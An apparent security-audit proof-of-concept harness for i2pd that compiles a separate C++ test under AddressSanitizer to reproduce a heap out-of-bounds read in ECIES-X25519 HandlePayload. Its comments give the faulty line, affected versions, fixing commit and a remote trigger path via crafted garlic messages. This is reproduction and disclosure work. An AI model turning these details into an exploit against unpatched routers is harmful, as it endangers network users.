#!/usr/bin/env python3
"""
VULN-03 PoC — i2pd ECIES-X25519 HandlePayload 块边界堆越界读 (单元级)
漏洞: libi2pd/ECIESX25519AEADRatchetSession.cpp:404 (2.61.0)  `if (size > len)` 应为 offset+size>len
用法: python3 poc_c2.py   (首次自动编译)
判定: ASan heap-buffer-overflow READ @ ECIESX25519AEADRatchetSession.cpp → 复现成功
定级说明(诚实): 远程路径: 知道目标 destination 公钥者发送 ECIES garlic 消息即达 (所有跑隧道/服务的路由器); dev 已由 575acd6f 修复, 2.30.0-2.61.0 受影响
"""
import os, sys, subprocess
os.environ['PATH'] = '/home/z/my-project/audit/tools/usr/usr/lib/llvm-19/bin:/home/z/.venv/bin:' + os.environ.get('PATH','')

DIR = os.path.dirname(os.path.abspath(__file__))
AUDIT = '/home/z/my-project/audit'
BUILDS = f'{AUDIT}/builds'
SRC = os.path.join(DIR, 'poc_c2.cpp')

BUILD_CMD = ('clang++ -g -O1 -std=c++20 -fsanitize=address,undefined -fno-omit-frame-pointer '
    f'-I{BUILDS}/asan/libi2pd -I{BUILDS}/asan/libi2pd_client {SRC} '
    f'{BUILDS}/asan/libi2pd.a {BUILDS}/asan/libi2pdlang.a '
    f'-L{AUDIT}/tools/usr/usr/lib/x86_64-linux-gnu -lssl -lcrypto -lz '
    '-lboost_program_options -lpthread -latomic -o poc_c2')

def main():
    binp = os.path.join(DIR, 'poc_c2')
    if not os.path.exists(binp) or os.path.getmtime(SRC) > os.path.getmtime(binp):
        print('[*] 编译 PoC...')
        r = subprocess.run(BUILD_CMD, shell=True, capture_output=True, text=True, cwd=DIR)
        if r.returncode != 0:
            print(r.stdout[-1200:] + r.stderr[-1200:]); sys.exit(2)
    env = dict(os.environ, ASAN_OPTIONS='detect_leaks=0:abort_on_error=1:symbolize=1')
    r = subprocess.run([binp], capture_output=True, text=True, env=env, timeout=60)
    out = r.stdout + r.stderr
    print(out[:1400])
    if 'ERROR: AddressSanitizer' in out:
        print('\n[+] 复现成功 — VULN-03 ECIES HandlePayload 堆越界读 (最大 ~len 字节)')
        return 0
    print('\n[-] 未复现')
    return 1

if __name__ == '__main__':
    sys.exit(main())
